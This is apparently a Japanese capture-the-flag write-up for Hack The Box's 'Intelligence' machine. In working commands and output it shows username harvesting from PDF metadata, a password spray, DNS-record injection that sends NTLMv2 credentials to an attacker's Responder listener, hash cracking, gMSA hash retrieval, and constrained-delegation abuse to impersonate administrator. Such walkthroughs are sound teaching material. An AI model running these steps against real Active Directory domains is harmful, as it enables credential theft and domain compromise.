https://app.hackthebox.com/machines/Intelligence

## STEP 1
```sh
└─$ rustscan -a 10.129.95.154 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.154:53
Open 10.129.95.154:80
Open 10.129.95.154:88
Open 10.129.95.154:135
Open 10.129.95.154:139
Open 10.129.95.154:389
Open 10.129.95.154:445
Open 10.129.95.154:464
Open 10.129.95.154:593
Open 10.129.95.154:636
Open 10.129.95.154:3269
Open 10.129.95.154:3268
Open 10.129.95.154:5985
Open 10.129.95.154:9389
Open 10.129.95.154:49668
Open 10.129.95.154:49693
Open 10.129.95.154:49694
Open 10.129.95.154:49713
Open 10.129.95.154:49718
10.129.95.154 -> [53,80,88,135,139,389,445,464,593,636,3269,3268,5985,9389,49668,49693,49694,49713,49718]
```


## STEP 2
80番にアクセス  
ページ内のdownloadをクリックすると、pdfにリダイレクトされる  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_01.png">  
なぞの言語だがググってみると、「lorem ipsum」というダミーテキストらしい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_02.png">  
pdfの名前は２つとも日付形式だったが、もしかしたら別の日付がファイル名として存在するかも  
ということでまずは2020年から2021年までの日付のリストを作成
```sh
└─$ seq -w 2020 2021 > years.txt

└─$ seq -w 1 12 > months.txt

└─$ seq -w 1 31 > days.txt
```
列挙  
他にもpdfファイルを発見（結果は省略）
```sh
└─$ ffuf -u http://10.129.95.154/documents/yearFUZZ-monthFUZZ-dayFUZZ-upload.pdf -c -v -w years.txt:yearFUZZ  -w months.txt:monthFUZZ -w days.txt:dayFUZZ -o results.txt -of csv

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.154/documents/yearFUZZ-monthFUZZ-dayFUZZ-upload.pdf
 :: Wordlist         : yearFUZZ: /home/kali/years.txt
 :: Wordlist         : monthFUZZ: /home/kali/months.txt
 :: Wordlist         : dayFUZZ: /home/kali/days.txt
 :: Output file      : results.txt
 :: File format      : csv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 11254, Words: 175, Lines: 135, Duration: 1207ms]
| URL | http://10.129.95.154/documents/2021-03-01-upload.pdf
    * dayFUZZ: 01
    * monthFUZZ: 03
    * yearFUZZ: 2021

[Status: 200, Size: 11466, Words: 156, Lines: 134, Duration: 2714ms]
| URL | http://10.129.95.154/documents/2020-04-02-upload.pdf
    * dayFUZZ: 02
    * monthFUZZ: 04
    * yearFUZZ: 2020

~~~

:: Progress: [744/744] :: Job [1/1] :: 106 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```
pdfファイルをダウンロード
```sh
└─$ grep 'http' results.txt | awk -F ',' '{print $4}' | sort > urls.txt

└─$ for url in (cat urls.txt); do curl -O -s "$url"; done

└─$ ls
2020-01-01-upload.pdf  2020-03-05-upload.pdf  2020-05-21-upload.pdf  2020-06-28-upload.pdf  2020-09-06-upload.pdf  2020-11-13-upload.pdf  2021-02-21-upload.pdf
2020-01-02-upload.pdf  2020-03-12-upload.pdf  2020-05-24-upload.pdf  2020-06-30-upload.pdf  2020-09-11-upload.pdf  2020-11-24-upload.pdf  2021-02-25-upload.pdf
2020-01-04-upload.pdf  2020-03-13-upload.pdf  2020-05-29-upload.pdf  2020-07-02-upload.pdf  2020-09-13-upload.pdf  2020-11-30-upload.pdf  2021-03-01-upload.pdf
2020-01-10-upload.pdf  2020-03-17-upload.pdf  2020-06-02-upload.pdf  2020-07-06-upload.pdf  2020-09-16-upload.pdf  2020-12-10-upload.pdf  2021-03-07-upload.pdf
2020-01-20-upload.pdf  2020-03-21-upload.pdf  2020-06-03-upload.pdf  2020-07-08-upload.pdf  2020-09-22-upload.pdf  2020-12-15-upload.pdf  2021-03-10-upload.pdf
2020-01-22-upload.pdf  2020-04-02-upload.pdf  2020-06-04-upload.pdf  2020-07-20-upload.pdf  2020-09-27-upload.pdf  2020-12-20-upload.pdf  2021-03-18-upload.pdf
2020-01-23-upload.pdf  2020-04-04-upload.pdf  2020-06-07-upload.pdf  2020-07-24-upload.pdf  2020-09-29-upload.pdf  2020-12-24-upload.pdf  2021-03-21-upload.pdf
2020-01-25-upload.pdf  2020-04-15-upload.pdf  2020-06-08-upload.pdf  2020-08-01-upload.pdf  2020-09-30-upload.pdf  2020-12-28-upload.pdf  2021-03-25-upload.pdf
2020-01-30-upload.pdf  2020-04-23-upload.pdf  2020-06-12-upload.pdf  2020-08-03-upload.pdf  2020-10-05-upload.pdf  2020-12-30-upload.pdf  2021-03-27-upload.pdf
2020-02-11-upload.pdf  2020-05-01-upload.pdf  2020-06-14-upload.pdf  2020-08-09-upload.pdf  2020-10-19-upload.pdf  2021-01-03-upload.pdf
2020-02-17-upload.pdf  2020-05-03-upload.pdf  2020-06-15-upload.pdf  2020-08-19-upload.pdf  2020-11-01-upload.pdf  2021-01-14-upload.pdf
2020-02-23-upload.pdf  2020-05-07-upload.pdf  2020-06-21-upload.pdf  2020-08-20-upload.pdf  2020-11-03-upload.pdf  2021-01-25-upload.pdf
2020-02-24-upload.pdf  2020-05-11-upload.pdf  2020-06-22-upload.pdf  2020-09-02-upload.pdf  2020-11-06-upload.pdf  2021-01-30-upload.pdf
2020-02-28-upload.pdf  2020-05-17-upload.pdf  2020-06-25-upload.pdf  2020-09-04-upload.pdf  2020-11-10-upload.pdf  2021-02-10-upload.pdf
2020-03-04-upload.pdf  2020-05-20-upload.pdf  2020-06-26-upload.pdf  2020-09-05-upload.pdf  2020-11-11-upload.pdf  2021-02-13-upload.pdf
```
パスワードっぽいものを含んだpdfを発見
```sh
└─$ pdfgrep -r 'password' 
./2020-06-04-upload.pdf:Please login using your username and the default password of:
./2020-06-04-upload.pdf:After logging in please change your password as soon as possible.

└─$ pdfgrep '' 2020-06-04-upload.pdf 
New Account Guide

Welcome to Intelligence Corp!

Please login using your username and the default password of:

NewIntelligenceCorpUser9876


After logging in please change your password as soon as possible.
```
またpdfのメタ情報に、creatorを確認
```
└─$ exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 13.25
File Name                       : 2020-01-01-upload.pdf
Directory                       : Downloads
File Size                       : 27 kB
File Modification Date/Time     : 2025:11:23 13:30:42-05:00
File Access Date/Time           : 2025:11:23 13:30:42-05:00
File Inode Change Date/Time     : 2025:11:23 13:30:42-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```
creatorに登録されたユーザ名は、windowsユーザかも  
kerberosを使用して確認すると、すべて有効なユーザ名であることを確認
```sh
└─$ exiftool -Creator -S . | grep 'Creator' | sort | uniq > creators.txt
Error: File is empty - ./creator.txt

└─$ cat creators.txt | awk '{print $2}' > users.txt

└─$ netexec smb 10.129.95.154 -u '' -p ''        
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\:

└─$ ./kerbrute_linux_amd64 userenum --dc 10.129.95.154 -d 'intelligence.htb' users.txt      

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/23/25 - Ronnie Flathers @ropnop

2025/11/23 13:28:03 >  Using KDC(s):
2025/11/23 13:28:03 >   10.129.95.154:88

2025/11/23 13:28:04 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2025/11/23 13:28:05 >  Done! Tested 30 usernames (30 valid) in 1.787 seconds
```
ログインブルートフォース  
Tiffany.Molinaでログイン成功
```sh
└─$ netexec smb 10.129.95.154 -u users.txt -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
usersフォルダが読み取り可能であったため、ユーザフラグゲット！
```sh
└─$ netexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares                      
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            

└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/Users/tiffany.molina/desktop/user.txt
Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
smb://10.129.95.154/Users/tiffany.molina/desktop/user.txt                                                                                                              
Downloaded 34b in 7 seconds

└─$ cat user.txt                                 
7e6cfe6d57ea9780f87086f2b6223d4c
```


## STEP 3
step2でitフォルダも読み取り可能であることを確認  
中にはpowershellスクリプトを確認
```sh
└─$ smbclient -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' -c 'dir' //10.129.95.154/IT
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1441638 blocks available

└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/IT/downdetector.ps1
Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
smb://10.129.95.154/IT/downdetector.ps1 
Downloaded 1.02kB in 7 seconds
```
webから始まるdnsレコード名に対してinvoke-webrequestを実行  
またコマンドには、ユーザのクレデンシャルを使用するオプションが使用されていることを確認
```powershell
└─$ cat downdetector.ps1 
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
activedirectoryはdnsとしてadidnsを使用できるが、adidnsのデフォルトではどのユーザでもdnsレコードが作成可能である。[リンク](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)  
ldap上では、「DC=DomainDnsZones,DC=intelligence,DC=htb」にバインディングするとdnsレコードが確認できる  
(godapではバインディング先を指定しなくとも、adidnsタブで自動表示してくれる)    
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_03.png">  
またadidnsdumpというツールでも確認できる
```sh
└─$ python3.13 adidnsdump/dnsdump.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --print-zones 10.129.95.154 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Found 2 domain DNS zones:
    intelligence.htb
    RootDNSServers
[-] Found 1 forest DNS zones (dump with --forest):
    _msdcs.intelligence.htb
[-] Found 1 legacy DNS zones (dump with --legacy):
    RootDNSServers

└─$ python3.13 adidnsdump/dnsdump.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.129.95.154  
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 8 records, saving to records.csv

└─$ cat records.csv 
type,name,value
?,ForestDnsZones,?
?,DomainDnsZones,?
AAAA,dc,dead:beef::85e8:f613:63b0:9e75
A,dc,10.129.95.154
NS,_msdcs,dc.intelligence.htb.
AAAA,@,dead:beef::85e8:f613:63b0:9e75
NS,@,dc.intelligence.htb.
A,@,10.129.95.154
```
仮に先ほどのpowershellスクリプトが実行された場合、攻撃者のipに対応したdnsレコードにwebアクセス -> 攻撃者のhttpサーバ上でクレデンシャル窃取が可能である  
ということで、krbrelayxツールを使用してdnsレコード追加
```sh
└─$ python3.13 krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r web01 -d 10.10.16.33 10.129.95.154
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

└─$ python3.13 krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a query -r web01 10.129.95.154          
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record web01
DC=web01,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 113)
 - Address: 10.10.16.33


# ちなみにbloodyadでも追加できる
└─$ bloodyAD -d intelligence.htb -u tiffany.molina -p NewIntelligenceCorpUser9876 --host 10.129.95.154 add dnsRecord web01 10.10.16.33
[+] web01 has been successfully added
```
powershellスクリプト経由のwebリクエストを受信！  
ted.gravesのntlmv2チャレンジを取得
```sh
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.33]
    Responder IPv6             [dead:beef:4::101f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-MFNRPD6EEHX]
    Responder Domain Name      [Z08L.LOCAL]
    Responder DCE-RPC Port     [46357]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                                

[HTTP] Sending NTLM authentication request to 10.129.95.154
[HTTP] GET request from: ::ffff:10.129.95.154  URL: / 
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:3a4b4b0205562e23:6C5A2543D767342E8C900226A95407B5:010100000000000068BCE54C585EDC0199A62B61466ED78300000000020008005A00300038004C0001001E00570049004E002D004D0046004E0052005000440036004500450048005800040014005A00300038004C002E004C004F00430041004C0003003400570049004E002D004D0046004E00520050004400360045004500480058002E005A00300038004C002E004C004F00430041004C00050014005A00300038004C002E004C004F00430041004C00080030003000000000000000000000000020000005502C95DBE967A3B38620F3F7E21436C2D8ECCC806B8965750BCAD55C1BFBD40A001000000000000000000000000000000000000900360048005400540050002F00770065006200300031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```
クラック成功！  
パスワードはMr.Teddy
```sh
└─$ name-that-hash -f ted.graves.txt --no-banner                                

Ted.Graves::intelligence:3a4b4b0205562e23:6C5A2543D767342E8C900226A95407B5:010100000000000068BCE54C585EDC0199A62B61466ED78300000000020008005A00300038004C0001001E005700
49004E002D004D0046004E0052005000440036004500450048005800040014005A00300038004C002E004C004F00430041004C0003003400570049004E002D004D0046004E00520050004400360045004500480
058002E005A00300038004C002E004C004F00430041004C00050014005A00300038004C002E004C004F00430041004C00080030003000000000000000000000000020000005502C95DBE967A3B38620F3F7E214
36C2D8ECCC806B8965750BCAD55C1BFBD40A001000000000000000000000000000000000000900360048005400540050002F00770065006200300031002E0069006E00740065006C006C006900670065006E006
30065002E006800740062000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

└─$ hashcat -a 0 -m 5600 ted.graves.txt /usr/share/wordlists/rockyou.txt --quiet
TED.GRAVES::intelligence:3a4b4b0205562e23:6c5a2543d767342e8c900226a95407b5:010100000000000068bce54c585edc0199a62b61466ed78300000000020008005a00300038004c0001001e00570049004e002d004d0046004e0052005000440036004500450048005800040014005a00300038004c002e004c004f00430041004c0003003400570049004e002d004d0046004e00520050004400360045004500480058002e005a00300038004c002e004c004f00430041004c00050014005a00300038004c002e004c004f00430041004c00080030003000000000000000000000000020000005502c95dbe967a3b38620f3f7e21436c2d8eccc806b8965750bcad55c1bfbd40a001000000000000000000000000000000000000900360048005400540050002f00770065006200300031002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```


## STEP 4
bloodhoundの結果、ted.gravesが所属するグループはgmsa経由でsvc_int$のパスワードを確認できることが判明  
また、svc_int$から委任経由でドメコンのマシンアカウントにアクセスできることも確認  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_04.png">  
svc_int$のntハッシュ取得
```sh
└─$ netexec ldap 10.129.95.154 -u ted.graves -p Mr.Teddy --gmsa
LDAP        10.129.95.154  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
LDAPS       10.129.95.154  636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
LDAPS       10.129.95.154  636    DC               [*] Getting GMSA Passwords
LDAPS       10.129.95.154  636    DC               Account: svc_int$             NTLM: 5389896c2609ab8717b9d8f360f760ae     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
```
WWW/dc.intelligence.htbに対する委任が有効であることを確認
```sh
└─$ netexec ldap 10.129.95.154 -u 'svc_int$' -H 5389896c2609ab8717b9d8f360f760ae --find-delegation                        
LDAP        10.129.95.154  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
LDAP        10.129.95.154  389    DC               [+] intelligence.htb\svc_int$:5389896c2609ab8717b9d8f360f760ae 
LDAP        10.129.95.154  389    DC               AccountName AccountType                         DelegationType                     DelegationRightsTo     
LDAP        10.129.95.154  389    DC               ----------- ----------------------------------- ---------------------------------- -----------------------
LDAP        10.129.95.154  389    DC               svc_int$    ms-DS-Group-Managed-Service-Account Constrained w/ Protocol Transition WWW/dc.intelligence.htb
```
WWW/dc.intelligence.htbをspnとするtgsを取得
```sh
└─$ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -ts -dc-ip 10.129.95.154 -hashes ':5389896c2609ab8717b9d8f360f760ae' 'intelligence.htb/svc_int$'    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-25 18:24:59] [*] Getting TGT for user
[2025-11-25 18:25:02] [*] Impersonating administrator
[2025-11-25 18:25:02] [*] Requesting S4U2self
[2025-11-25 18:25:03] [*] Requesting S4U2Proxy
[2025-11-25 18:25:05] [*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```
```sh
└─$ impacket-describeTicket administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : a787b932d268339b925652a7454e17c0
[*] User Name                     : administrator
[*] User Realm                    : intelligence.htb
[*] Service Name                  : WWW/dc.intelligence.htb
[*] Service Realm                 : INTELLIGENCE.HTB
[*] Start Time                    : 25/11/2025 18:25:04 PM
[*] End Time                      : 26/11/2025 04:25:01 AM
[*] RenewTill                     : 26/11/2025 18:25:00 PM
[*] Flags                         : (0x40a50000) forwardable, renewable, pre_authent, ok_as_delegate, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : p4e5MtJoM5uSVlKnRU4XwA==
[*] Kerberoast hash               : $krb5tgs$18$USER$INTELLIGENCE.HTB$*WWW/dc.intelligence.htb*$09057378883e0377397af3b4$699d5b7ca0035a4b12f7595cfc25fda82b57eb160461fd29f3db42ea33cb9dd566037284eb8a73326b9ce5162b9f3ad299bf0b0d719972b09ba811bbb771b42f09121d18da4e627736fac2bb0ce6f3614e8e3a522c4473f0b5d3d16987d288b00a9092779ecd3f647395c4b8b4fab39f6ccdff0828b58c593249d93e200f683e8a9f4f92dd5000356bac8631bd14dd25190ac975838bbe068f4d9844eba1e982fbcfa43b2a3633c6032f31dfcd7a378dd379bd8ca31782b2771410001608c23af7b83131d31e4a03897596da3614bac6e1e13115f135533528540f78c2dd58f8d0677d97282268793198fbde62f3e1555c18d630792dd08249afa2b3ef61db3974a4bce73bc0a75ebd25a1f3cc06a507a87726ba4f5ce48f75965b63c1103d65bc39bc54a80d9a292c37358c9a87ff0182e493d225c655dae121997936891d8cbe64d3d702a2ae418b06afcf6226e34a1b492c7ab49ce9d3717ca0f199c69e40208f4ddf6be86667d6e9fa3bbb70c54d8fb6231bfb5ee4d8c7f8bfd744f52703c6fba9ef8ff0fa67f02825163d50b1c91fa83cda0dd4bdf5ab5c32c0a708e0057d775280f6905171178c76deec54527965e9d406beae82fb20b9d8f5e